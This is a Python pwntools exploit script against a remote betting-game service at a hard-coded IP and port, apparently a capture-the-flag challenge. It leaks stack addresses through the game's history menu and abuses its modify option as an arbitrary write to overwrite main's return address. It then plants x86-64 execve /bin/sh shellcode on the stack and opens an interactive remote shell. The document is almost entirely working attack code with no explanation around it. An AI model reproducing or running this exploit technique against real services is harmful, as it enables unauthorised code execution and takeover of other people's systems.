#!/usr/bin/python
from pwn import *

context(arch='x86', os='linux', endian='little')

p = remote("143.248.249.153", 4006)
p.recvuntil(":")
p.send("test\n");
p.recvuntil("Betting amount (USD) : ")
p.send("1\n")
deposit = p.recvuntil("Which option do you select? ").split('\n')[9].split(' ')[1]
while(int(deposit) < 200) :
	print("current deposit: " + deposit)
	p.send("y\n")
	p.recvuntil("Betting amount (USD) : ")
	p.send("1\n")
	deposit = p.recvuntil("Which option do you select? ").split('\n')[9].split(' ')[1]
print("current deposit: " + deposit)

# now, all menu available...

# find 135, 134 index's memory content
p.send("h\n")
p.recvuntil("Which round do you want to view? (number) ")
p.send("135\n")
argvaddr1 = p.recvuntil("Which option do you select? ").split('\n')[2].split(' ')[7].split(',')[0]

p.send("h\n")
p.recvuntil("Which round do you want to view? (number) ")
p.send("134\n")
argvaddr2 = p.recvuntil("Which option do you select? ").split('\n')[2].split(' ')[7].split(',')[0]

argvaddr = str(hex(int(argvaddr1))) + str(hex(int(argvaddr2) & 0xffffffff))[2:]
print("argv memory content : " + argvaddr)

main_ret_addr_next = str(hex(int(argvaddr, 16) - 216))
print("main ret addr's next address : " + main_ret_addr_next)

main_ret_addr_next1 = main_ret_addr_next[:-8]
main_ret_addr_next2 = "0x"+main_ret_addr_next[-8:]
print(main_ret_addr_next1)
print(main_ret_addr_next2)
main_ret_addr_next1 = int(main_ret_addr_next1, 16) & 0xffffffff
main_ret_addr_next2 = int(main_ret_addr_next2, 16) & 0xffffffff
print(main_ret_addr_next1)
print(main_ret_addr_next2)

# change main ret addr into main ret addr's next address
p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("131\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(main_ret_addr_next1)+"\n")

p.recvuntil("Which option do you select? ")

p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("130\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(main_ret_addr_next2)+"\n")

p.recvuntil("Which option do you select? ")


# check if the main ret address is changed into next address
p.send("h\n")
p.recvuntil("Which round do you want to view? (number) ")
p.send("131\n")
argvaddr1 = p.recvuntil("Which option do you select? ").split('\n')[2].split(' ')[7].split(',')[0]

p.send("h\n")
p.recvuntil("Which round do you want to view? (number) ")
p.send("130\n")
argvaddr2 = p.recvuntil("Which option do you select? ").split('\n')[2].split(' ')[7].split(',')[0]

argvaddr = str(hex(int(argvaddr1))) + str(hex(int(argvaddr2) & 0xffffffff))[2:]
print("main ret address's content : " + argvaddr)


# shell code : https://www.exploit-db.com/exploits/42179
#
# 50				
# 48 31 d2
# 48 31 f6
# 48 bb 2f 62 69 6e 2f
# 2f 73 68
# 53
# 54
# 5f
# b0 3b
# 0f 05

# [129][128]                    [131]         [130]
# [133]48f63148 [132]d2314850   [135]732f2f6e [134]69622fbb
# [137]050f3bb0 [136]5f545368   [139]         [138]

p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("132\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(int("0xd2314850",16)&0xffffffff)+"\n")
p.recvuntil("Which option do you select? ")

p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("133\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(int("0x48f63148",16)&0xffffffff)+"\n")
p.recvuntil("Which option do you select? ")

p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("134\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(int("0x69622fbb",16)&0xffffffff)+"\n")
p.recvuntil("Which option do you select? ")

p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("135\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(int("0x732f2f6e",16)&0xffffffff)+"\n")
p.recvuntil("Which option do you select? ")

p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("136\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(int("0x5f545368",16)&0xffffffff)+"\n")
p.recvuntil("Which option do you select? ")

p.send("m\n")
p.recvuntil("Which round do you want to change? (number) ")
p.send("137\n")
p.recvuntil("What amount do you want to change?.. (number) ")
p.send(str(int("0x050f3bb0",16)&0xffffffff)+"\n")
p.recvuntil("Which option do you select? ")



p.send("n\n")
print(p.recv())
p.interactive()

